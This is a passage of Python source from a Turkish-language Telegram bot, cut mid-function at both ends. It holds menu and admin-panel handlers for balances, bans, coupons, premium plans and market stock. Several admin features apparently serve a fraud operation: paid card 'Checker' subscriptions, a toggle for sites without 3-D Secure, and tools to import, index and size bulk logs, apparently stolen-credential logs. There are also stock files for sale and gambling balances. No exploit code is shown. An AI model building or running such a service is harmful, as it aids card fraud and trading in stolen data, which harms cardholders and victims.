      types.InlineKeyboardButton("💸 Para Çek (Referans)", callback_data="personal_withdraw"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    try:
      bot.edit_message_text(
        t(user_id, "referans_title", bot=BOT_USERNAME, uid=user_id, ref=new_ref_bal, bal=norm_bal),
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
      )
    except:
      pass

  elif call.data == "personal_coupon":
    safe_answer()
    user_states[chat_id] = "waiting_coupon_code"
    bot.send_message(chat_id, "🎟️ **Kupon Kullan**\n\nKupon kodunu yazın (büyük/küçük harf fark etmez):", parse_mode="Markdown")

  elif call.data == "menu_support":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ Talebi Aç", callback_data="support_new"), types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
    try: bot.edit_message_text(t(user_id, "support_title"), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "support_new":
    safe_answer()
    user_states[chat_id] = "waiting_ticket_msg"
    bot.send_message(chat_id, "📝 Sorununuzu detaylı yazın:", parse_mode="Markdown")

  elif call.data.startswith("answer_ticket_"):
    if user_id not in admin_ids_set: return
    safe_answer()
    t_id = call.data.split("_")[2]
    admin_temp_data[chat_id] = {'answering_ticket_id': t_id}
    user_states[chat_id] = "waiting_admin_ticket_reply"
    bot.send_message(chat_id, f"✉️ `{t_id}` talebe yanıtınızı yazın:", parse_mode="Markdown")

  elif call.data == "personal_withdraw":
    safe_answer()
    ref_bal = ref_balances.get(user_id, 0.0)
    if ref_bal <= 0:
      bot.send_message(chat_id, "❌ Referans bakiyeniz 0 TL.")
      return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Talep Oluştur", callback_data="withdraw_enter_amount"))
    try: bot.edit_message_text(f"💸 **Para Çekme**\n💰 Bakiye: **{ref_bal:.2f} TL**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "withdraw_enter_amount":
    safe_answer()
    user_states[chat_id] = "waiting_withdraw_amount"
    bot.send_message(chat_id, f"💵 Çekmek istediğiniz miktarı yazın:")

  elif call.data == "menu_admin":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    check_maintenance_expiry()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("👥 Kullanıcılar", callback_data="admin_cat_users"),
      types.InlineKeyboardButton("💰 Ekonomi", callback_data="admin_cat_economy"),
    )
    markup.add(
      types.InlineKeyboardButton("🛒 Market / Stok", callback_data="admin_cat_market"),
      types.InlineKeyboardButton("🎟 Grup Kodları", callback_data="admin_group_codes"),
      types.InlineKeyboardButton("📋 Log Sistemi", callback_data="admin_cat_logs"),
    )
    markup.add(
      types.InlineKeyboardButton("🔧 Sistem / Bakım", callback_data="admin_cat_system"),
      types.InlineKeyboardButton("📢 İçerik / Duyuru", callback_data="admin_cat_content"),
    )
    markup.add(
      types.InlineKeyboardButton("🚨 Raporlar / Destek", callback_data="admin_cat_reports"),
      types.InlineKeyboardButton("👑 Yetki / Admin", callback_data="admin_cat_staff"),
    )
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
    admin_header = (
      f"{t(user_id, 'admin_title')}\n\n"
      f"{urls_log_status_text()}\n"
      f"📁 Inbox: **{len(list_log_inbox_files())}** dosya\n"
      f"🔧 Bakım: **{'AÇIK 🔴' if maintenance_mode else 'KAPALI 🟢'}** ({maintenance_remaining_str()})\n"
      f"🔍 3D'siz: **{'AÇIK ✅' if feature_3dsiz_enabled else 'KAPALI ❌'}**\n\n"
      f"Kategori seç ↓"
    )
    try:
      bot.edit_message_text(admin_header, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, admin_header, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass

  elif call.data == "admin_cat_users":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("👥 Kullanıcılar ve Bakiyeler", callback_data="admin_list_users"),
      types.InlineKeyboardButton("💰 Bakiye Yükle (Normal/Ref)", callback_data="admin_add_balance"),
      types.InlineKeyboardButton("💎 Premium Ver / Al", callback_data="admin_premium_menu"),
      types.InlineKeyboardButton("📋 Aktif Aboneler", callback_data="admin_list_subs"),
      types.InlineKeyboardButton("📈 Abonelik Geliri", callback_data="admin_sub_revenue"),
      types.InlineKeyboardButton("🎲 Kumar Bakiyesi Yükle", callback_data="admin_add_gamble_bal"),
      types.InlineKeyboardButton("🚫 Banlı ID Listesi", callback_data="admin_list_bans"),
      types.InlineKeyboardButton("🗑️ Bakiye Sil", callback_data="admin_delete_balance"),
      types.InlineKeyboardButton("🗑️ Toplu Bakiye Sil", callback_data="admin_bulk_del_bal"),
      types.InlineKeyboardButton("🚫 Kalıcı Ban", callback_data="admin_ban"),
      types.InlineKeyboardButton("⏳ 1 Günlük Ban", callback_data="admin_temp_ban"),
      types.InlineKeyboardButton("🚫 Toplu Ban", callback_data="admin_bulk_ban"),
      types.InlineKeyboardButton("✅ Ban Kaldır", callback_data="admin_unban"),
      types.InlineKeyboardButton("🔓 Tüm Süper Banları Aç", callback_data="admin_clear_hard_bans"),
      types.InlineKeyboardButton("⚠️ Kullanıcıyı Uyar", callback_data="admin_warn_user"),
      types.InlineKeyboardButton("📊 İstatistikler & Üyeler", callback_data="admin_stats"),
      types.InlineKeyboardButton("🤖 Bot Durumu", callback_data="admin_bot_status"),
      types.InlineKeyboardButton("💾 Yedek Al (dosya)", callback_data="admin_backup_now"),
      types.InlineKeyboardButton("🛡️ Flood Ayarları", callback_data="admin_flood_settings"),

      types.InlineKeyboardButton("📊 Son 24 Saat Aktivite", callback_data="admin_24h_activity"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text("👥 **Kullanıcı Yönetimi**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "👥 **Kullanıcı Yönetimi**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_premium_menu":
    if user_id not in admin_ids_set:
      safe_answer("Yetkin yok", show_alert=True)
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for k, p in CHECKER_SUB_PLANS.items():
      markup.add(types.InlineKeyboardButton(
        f"➕ Ver: {p['title']}", callback_data=f"admin_prem_grant_{k}"
      ))
    markup.add(types.InlineKeyboardButton("➖ Premium Al (iptal)", callback_data="admin_prem_revoke"))
    markup.add(types.InlineKeyboardButton("🎫 Ozel hediye kodu yaz", callback_data="admin_prem_custom_code"))
    markup.add(types.InlineKeyboardButton("🔍 Kullanıcı sorgula", callback_data="admin_prem_check"))
    markup.add(types.InlineKeyboardButton("📋 Aktif liste", callback_data="admin_list_subs"))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="admin_cat_users"))
    try:
      bot.edit_message_text(
        "💎 **Premium / Checker abonelik**\n\n"
        "Kullanıcıya paket ver veya iptal et.\n"
        "Verince kullanıcıya da bildirim gider.",
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown",
      )
    except Exception:
      bot.send_message(chat_id, "💎 Premium yönetimi", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("admin_prem_grant_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    plan_key = call.data.replace("admin_prem_grant_", "", 1)
    if plan_key not in CHECKER_SUB_PLANS:
      return
    admin_temp_data[chat_id] = {"admin_prem_plan": plan_key}
    user_states[chat_id] = "waiting_admin_prem_grant_id"
    bot.send_message(
      chat_id,
      f"➕ **Premium ver** — {(CHECKER_SUB_PLANS[plan_key] or {}).get('title')}\n\n"
      f"Kullanıcı **ID** yaz (sadece sayı):\nİptal: /iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data == "admin_prem_revoke":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_admin_prem_revoke_id"
    bot.send_message(chat_id, "➖ Premium **iptal** edilecek kullanıcı ID:\nİptal: /iptal", parse_mode="Markdown")
    return

  elif call.data == "admin_prem_check":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_admin_prem_check_id"
    bot.send_message(chat_id, "🔍 Sorgulanacak kullanıcı ID:\nİptal: /iptal")
    return

  elif call.data == "admin_sub_revenue":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    body = sub_revenue_summary(7) + "\n\n---\n\n" + sub_revenue_summary(30)
    body = body.replace("\\n", "\n")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Geri", callback_data="admin_premium_menu"))
    try:
      bot.edit_message_text(body[:4000], chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
      bot.send_message(chat_id, body[:4000], reply_markup=markup)
    return

  elif call.data == "admin_list_subs":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    rows = list_active_checker_subs(40)
    if not rows:
      body = "📋 Aktif checker abonesi yok."
    else:
      lines = [f"📋 **Aktif aboneler** ({len(rows)})\n"]
      for uid, title, left, via, bought in rows:
        lines.append(f"• `{uid}` — {title} · {left} · {via}")
      body = "\n".join(lines)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Premium", callback_data="admin_premium_menu"))
    try:
      bot.edit_message_text(body[:4000], chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, body[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_cat_economy":

    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("⭐ Bekleyen Yıldız Ödemeleri", callback_data="admin_pending_stars"),
      types.InlineKeyboardButton("🎰 Jackpot Yönetimi", callback_data="admin_jackpot_manage"),
      types.InlineKeyboardButton("🏆 Turnuva Ödül Dağıt", callback_data="admin_tournament_reward"),
      types.InlineKeyboardButton("🏆 Referans Sıralaması", callback_data="admin_ref_week"),
      types.InlineKeyboardButton("🎟️ Kupon Oluştur", callback_data="admin_create_coupon"),
      types.InlineKeyboardButton("📋 Aktif Kuponlar", callback_data="admin_list_coupons"),
      types.InlineKeyboardButton("⏳ Çekim Limit/Komisyon", callback_data="admin_withdraw_settings"),
      types.InlineKeyboardButton("💰 Görev Ekle (Para Kazan)", callback_data="admin_add_earn_task"),
      types.InlineKeyboardButton("📋 Görevleri Yönet", callback_data="admin_list_earn_tasks"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text("💰 **Ekonomi**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "💰 **Ekonomi**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_cat_market":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🛒 Market Ürün Ekle", callback_data="admin_add_market_item"),
      types.InlineKeyboardButton("📦 Market Stok Yönetimi", callback_data="admin_market_stock"),
      types.InlineKeyboardButton("📢 İlan Yönetimi", callback_data="admin_manage_listings"),
      types.InlineKeyboardButton("📂 Üye Alanı Ekle", callback_data="admin_add_custom_area"),
      types.InlineKeyboardButton("🗑️ Üye Alanı Sil", callback_data="admin_remove_custom_area"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text("🛒 **Market / Stok / İlan**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "🛒 **Market / Stok / İlan**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_cat_logs":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📎 Log URL Ekle (TXT)", callback_data="admin_add_log_urls"),
      types.InlineKeyboardButton("📥 log_inbox İçe Aktar", callback_data="admin_import_log_inbox"),
      types.InlineKeyboardButton("⚡ Log Shard Index (hızlı arama)", callback_data="admin_build_shards"),
      types.InlineKeyboardButton("📊 Shard Durumu", callback_data="admin_shard_stats"),
      types.InlineKeyboardButton("📊 KAÇ MB LOG VAR", callback_data="admin_log_size"),
      types.InlineKeyboardButton("📋 Log Listesi / Temizle", callback_data="admin_list_log_urls"),
      types.InlineKeyboardButton("📋 Aktivite Logları", callback_data="admin_view_logs"),
      types.InlineKeyboardButton("📜 Hata Logları", callback_data="admin_error_logs"),
      types.InlineKeyboardButton("📊 Spam Dashboard", callback_data="admin_spam_dash"),
      types.InlineKeyboardButton("📈 Günlük Özet", callback_data="admin_daily_summary"),
      types.InlineKeyboardButton("🛡 Şüphe Skoru", callback_data="admin_suspicion"),
      types.InlineKeyboardButton("💾 Yedek Geri Yükle", callback_data="admin_backup_list"),
      types.InlineKeyboardButton("🔧 Bakım Şablonları", callback_data="admin_maint_templates"),
      types.InlineKeyboardButton("📢 Duyuru Önizleme", callback_data="admin_broadcast_preview"),
      types.InlineKeyboardButton("🔧 Bakım 30dk", callback_data="maint_quick_30"),
      types.InlineKeyboardButton("🔧 Bakım 2sa", callback_data="maint_quick_120"),
      types.InlineKeyboardButton("✅ Bakım Kapat", callback_data="maint_quick_off"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text(
        f"📋 **Log Sistemi**\n\n{urls_log_status_text()}\n📁 Inbox: **{len(list_log_inbox_files())}**",
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
      )
    except Exception:
      bot.send_message(chat_id, "📋 **Log Sistemi**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_cat_system":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    check_maintenance_expiry()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🔧 Bakım Aç/Kapat", callback_data="admin_toggle_maintenance"),
      types.InlineKeyboardButton("⏱ Süreli Bakım", callback_data="admin_timed_maintenance"),
      types.InlineKeyboardButton("📝 Bakım Mesajı", callback_data="admin_set_maint_msg"),
      types.InlineKeyboardButton("🔍 3D'siz Site Aç/Kapat", callback_data="admin_toggle_3dsiz"),
      types.InlineKeyboardButton(
        f"📞 Telz {'AÇ (bakımdan çıkar)' if not feature_telz_enabled else 'KAPAT (bakıma al)'}",
        callback_data="admin_toggle_telz",
      ),
      types.InlineKeyboardButton("💾 Yedek Al", callback_data="admin_backup"),
      types.InlineKeyboardButton("♻️ Botu Yeniden Başlat", callback_data="admin_restart"),
      types.InlineKeyboardButton("🛑 Botu Durdur", callback_data="admin_graceful_stop"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text(
        f"🔧 **Sistem / Bakım**\n\nBakım: **{'AÇIK 🔴' if maintenance_mode else 'KAPALI 🟢'}**\nKalan: **{maintenance_remaining_str()}**\n3D'siz: **{'AÇIK' if feature_3dsiz_enabled else 'KAPALI'}**",
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
      )
    except Exception:
      bot.send_message(chat_id, "🔧 **Sistem / Bakım**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_cat_content":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📢 Toplu Duyuru", callback_data="admin_broadcast"),
      types.InlineKeyboardButton("📊 Anket Oluştur", callback_data="admin_create_poll"),
      types.InlineKeyboardButton("🎵 TR Marş Yükle (Osman Paşa)", callback_data="admin_upload_music_tr"),
      types.InlineKeyboardButton("🎵 KU Marş Yükle (Ey Reqîb)", callback_data="admin_upload_music_ku"),
      types.InlineKeyboardButton("🎧 Şarkı Durumu / Test", callback_data="admin_music_status"),
      types.InlineKeyboardButton("⭐ Bot Puanları", callback_data="admin_bot_ratings"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text(
        "📢 **İçerik / Duyuru**\n\n" + lang_music_status_text(),
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
      )
    except Exception:
      bot.send_message(chat_id, "📢 **İçerik / Duyuru**", reply_markup=markup, parse_mode="Markdown")

  elif call.data in ("admin_upload_music_tr", "admin_upload_music_ku"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    lang = "tr" if call.data.endswith("_tr") else "ku"
    admin_temp_data[chat_id] = {"upload_music_lang": lang}
    user_states[chat_id] = "waiting_admin_music_file"
    title = LANG_MUSIC_TITLES.get(lang, lang)
    bot.send_message(
      chat_id,
      f"🎵 **{title}**\n\n"
      f"Şimdi **mp3 / m4a / ogg** dosyasını Telegram'dan buraya gönder.\n"
      f"Kayıt adı: `{LANG_MUSIC_SAVE.get(lang)}`\n\n"
      f"İptal: /iptal",
      parse_mode="Markdown"
    )

  elif call.data == "admin_music_status":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("▶️ TR Test Gönder", callback_data="admin_test_music_tr"),
      types.InlineKeyboardButton("▶️ KU Test Gönder", callback_data="admin_test_music_ku"),
      types.InlineKeyboardButton("🔙 Geri", callback_data="admin_cat_content"),
    )
    bot.send_message(chat_id, lang_music_status_text(), reply_markup=markup, parse_mode="Markdown")

  elif call.data in ("admin_test_music_tr", "admin_test_music_ku"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    lang = "tr" if call.data.endswith("_tr") else "ku"
    old_lang = user_languages.get(user_id)
    user_languages[user_id] = lang
    ok = send_lang_welcome_music(chat_id, user_id)
    if old_lang:
      user_languages[user_id] = old_lang
    if not ok:
      bot.send_message(chat_id, "❌ Dosya bulunamadı. Önce yükle.")

  elif call.data == "admin_cat_reports":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🚨 Dolandırıcı Raporları", callback_data="admin_pending_scammers"),
      types.InlineKeyboardButton(f"🐛 Hata Bildirimleri (+{BUG_REPORT_REWARD:.0f} TL)", callback_data="admin_pending_bugs"),
      types.InlineKeyboardButton("🎫 Destek Talepleri", callback_data="admin_view_tickets"),
      types.InlineKeyboardButton(f"🔒 Bekleyen Süper Ban ({len(pending_hard_bans)})", callback_data="admin_pending_hardbans"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text("🚨 **Raporlar / Destek**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "🚨 **Raporlar / Destek**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_cat_staff":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("👑 Admin Ekle", callback_data="admin_add_admin"),
      types.InlineKeyboardButton("🚫 Admin Çıkar", callback_data="admin_remove_admin"),
      types.InlineKeyboardButton("🔙 Admin Ana Menü", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text("👑 **Yetki / Admin**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "👑 **Yetki / Admin**", reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_add_custom_area":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_custom_area_name"
    bot.send_message(chat_id, "📂 Üyeler için eklenecek yeni alanın **Başlığını / Adını** yazın:")
    return

  elif call.data == "admin_remove_custom_area":
    if user_id not in admin_ids_set: return
    safe_answer()
    if not custom_member_categories:
      bot.send_message(chat_id, "📭 Silinecek kayıtlı özel alan bulunmuyor.")
      return
    markup = types.InlineKeyboardMarkup(row_width=1)
    for c_id, c_data in custom_member_categories.items():
      markup.add(types.InlineKeyboardButton(f"🗑️ Sil: {c_data['name']}", callback_data=f"del_custom_cat_{c_id}"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_admin"))
    try:
      bot.edit_message_text("🗑️ **Silmek istediğiniz alanı seçin:**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, "🗑️ **Silmek istediğiniz alanı seçin:**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("del_custom_cat_"):
    if user_id not in admin_ids_set: return
    c_id = call.data.split("_")[3]
    if c_id in custom_member_categories:
      deleted_name = custom_member_categories[c_id]['name']
      del custom_member_categories[c_id]
      save_data()
      safe_answer(f"✅ '{deleted_name}' alanı başarıyla silindi!", show_alert=True)
      try:
        bot.delete_message(chat_id, call.message.message_id)
      except:
        pass
      ana_menu_goster(chat_id, user_id)
    else:
      safe_answer("❌ Alan bulunamadı!", show_alert=True)
    return

  elif call.data == "admin_list_users":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()

    all_users = list(registered_users)
    if not all_users:
      try:
        bot.edit_message_text("📭 Sistemde kayıtlı kullanıcı bulunmuyor.", chat_id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_admin")), parse_mode="Markdown")
      except:
        pass
      return

    markup = types.InlineKeyboardMarkup(row_width=1)
    text = f"👥 **Kayıtlı Kullanıcılar (Toplam {len(all_users)} kişi):**\n\n"
    for uid in all_users[:30]:
      bal = user_balances.get(uid, 0.0)
      status = "🟢 Aktif"
      if uid in banned_users:
        status = "🔴 Kalıcı Banlı"
      elif uid in temp_banned_users:
        if time.time() < temp_banned_users[uid]:
          status = "🟡 Süreli Banlı"
        else:
          status = "🟢 Aktif"

      text += f"👤 `{uid}` | Bakiye: **{bal:.2f} TL** | {status}\n"
      markup.add(types.InlineKeyboardButton(f"⚙️ Yönet: {uid} ({bal:.2f} TL)", callback_data=f"admin_manage_user_{uid}"))

    markup.add(types.InlineKeyboardButton("🔙 Admin Paneline Dön", callback_data="menu_admin"))

    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data.startswith("admin_manage_user_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    target_uid = int(call.data.split("_")[3])
    bal = user_balances.get(target_uid, 0.0)
    ref_bal = ref_balances.get(target_uid, 0.0)

    status = "🟢 Aktif"
    if target_uid in banned_users:
      status = "🔴 Kalıcı Banlı"
    elif target_uid in temp_banned_users:
      if time.time() < temp_banned_users[target_uid]:
        kalan = int(temp_banned_users[target_uid] - time.time())
        status = f"🟡 Süreli Banlı (Kalan: {kalan//3600}s)"
      else:
        status = "🟢 Aktif"

    text = (
      f"👤 **Kullanıcı Yönetim Paneli**\n\n"
      f"🆔 ID: `{target_uid}`\n"
      f"💵 Normal Bakiye: **{bal:.2f} TL**\n"
      f"💰 Referans Bakiyesi: **{ref_bal:.2f} TL**\n"
      f"📌 Durum: {status}\n"
    )

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🗑️ Bakiyeyi Sıfırla (Sil)", callback_data=f"admin_u_delbal_{target_uid}"),
      types.InlineKeyboardButton("🚫 Kalıcı Banla", callback_data=f"admin_u_permban_{target_uid}"),
      types.InlineKeyboardButton("⏳ 1 Günlük Banla", callback_data=f"admin_u_1d_ban_{target_uid}"),
      types.InlineKeyboardButton("📅 2 Haftalık Banla", callback_data=f"admin_u_2w_ban_{target_uid}"),
      types.InlineKeyboardButton("✅ Banı Kaldır", callback_data=f"admin_u_unban_{target_uid}"),
      types.InlineKeyboardButton("🔙 Kullanıcı Listesine Dön", callback_data="admin_list_users")
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data.startswith("admin_u_delbal_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[3])
    user_balances[target_uid] = 0.0
    ref_balances[target_uid] = 0.0
    save_data()
    safe_answer("✅ Kullanıcının bakiyeleri sıfırlandı!")
    call.data = f"admin_manage_user_{target_uid}"
    callback_query(call)
    return

  elif call.data.startswith("admin_u_permban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[3])
    if target_uid in admin_ids_set:
      safe_answer("❌ Bir yönetici banlanamaz!", show_alert=True)
      return
    banned_users.add(target_uid)
    temp_banned_users.pop(target_uid, None)
    if target_uid in unban_requests_sent:
      unban_requests_sent.remove(target_uid)
    save_data()
    safe_answer("✅ Kullanıcı kalıcı olarak banlandı!")
    try:
      bot.send_message(target_uid, "❌ Yöneticiler tarafından sistemden **kalıcı olarak banlandınız**.")
    except:
      pass
    call.data = f"admin_manage_user_{target_uid}"
    callback_query(call)
    return

  elif call.data.startswith("admin_u_1d_ban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[3])
    if target_uid in admin_ids_set:
      safe_answer("❌ Bir yönetici banlanamaz!", show_alert=True)
      return
    temp_banned_users[target_uid] = time.time() + 86400
    banned_users.discard(target_uid)
    if target_uid in unban_requests_sent:
      unban_requests_sent.remove(target_uid)
    save_data()
    safe_answer("✅ Kullanıcı 1 gün süreyle banlandı!")
    try:
      bot.send_message(target_uid, "⏳ Yöneticiler tarafından **1 gün süreyle** banlandınız.")
    except:
      pass
    call.data = f"admin_manage_user_{target_uid}"
    callback_query(call)
    return

  elif call.data.startswith("admin_u_2w_ban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[3])
    if target_uid in admin_ids_set:
      safe_answer("❌ Bir yönetici banlanamaz!", show_alert=True)
      return
    temp_banned_users[target_uid] = time.time() + (14 * 86400)
    banned_users.discard(target_uid)
    if target_uid in unban_requests_sent:
      unban_requests_sent.remove(target_uid)
    save_data()
    safe_answer("✅ Kullanıcı 2 hafta süreyle banlandı!")
    try:
      bot.send_message(target_uid, "⏳ Yöneticiler tarafından **2 hafta süreyle** banlandınız.")
    except:
      pass
    call.data = f"admin_manage_user_{target_uid}"
    callback_query(call)
    return

  elif call.data.startswith("admin_u_unban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[3])
    banned_users.discard(target_uid)
    temp_banned_users.pop(target_uid, None)
    if target_uid in unban_requests_sent:
      unban_requests_sent.remove(target_uid)
    save_data()
    safe_answer("✅ Kullanıcının banı kaldırıldı!")
    try:
      bot.send_message(target_uid, "🎉 Yöneticiler tarafından banınız kaldırıldı!")
    except:
      pass
    call.data = f"admin_manage_user_{target_uid}"
    callback_query(call)
    return

  elif call.data == "admin_add_admin":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_admin_add_admin_id"
    bot.send_message(chat_id, "👑 Yeni eklenecek yöneticinin **Telegram ID**'sini yazın:")

  elif call.data == "admin_remove_admin":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_admin_remove_id"
    bot.send_message(chat_id, "🚫 Yetkisi kaldırılacak yöneticinin **Telegram ID**'sini yazın:")

  elif call.data == "admin_temp_ban":
    if user_id not in admin_ids_set: return
    safe_answer()
    user_states[chat_id] = "waiting_admin_temp_ban_id"
    bot.send_message(chat_id, "⏳ 1 Günlük (Süreli) banlanacak kullanıcının **Telegram ID**'sini yazın:")

  elif call.data == "admin_market_stock":
    if user_id not in admin_ids_set: return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, item in market_data.items():
      if "stock_file" in item:
        if not os.path.exists(item["stock_file"]):
          with open(item["stock_file"], "w", encoding="utf-8") as f:
            f.write("")
        stock_count = len(get_stock_list(item["stock_file"]))
      else:
        stock_count = 0
      markup.add(
        types.InlineKeyboardButton(f"➕ {item['name']} Ekle ({stock_count})", callback_data=f"admin_add_stock_{key}"),
        types.InlineKeyboardButton(f"🗑️ {item['name']} Sıfırla", callback_data=f"admin_clear_stock_{key}")
      )
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_admin"))
    try: bot.edit_message_text("📦 **Stok Yönetimi**", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data.startswith("admin_add_stock_") or call.data.startswith("admin_clear_stock_"):
    if user_id not in admin_ids_set: return
    safe_answer()
    parts = call.data.split("_")
    action = parts[1]
    item_key = "_".join(parts[3:])
    if action == "add":
      admin_temp_data[chat_id] = {'stock_item_key': item_key}
      user_states[chat_id] = "waiting_admin_stock_content"
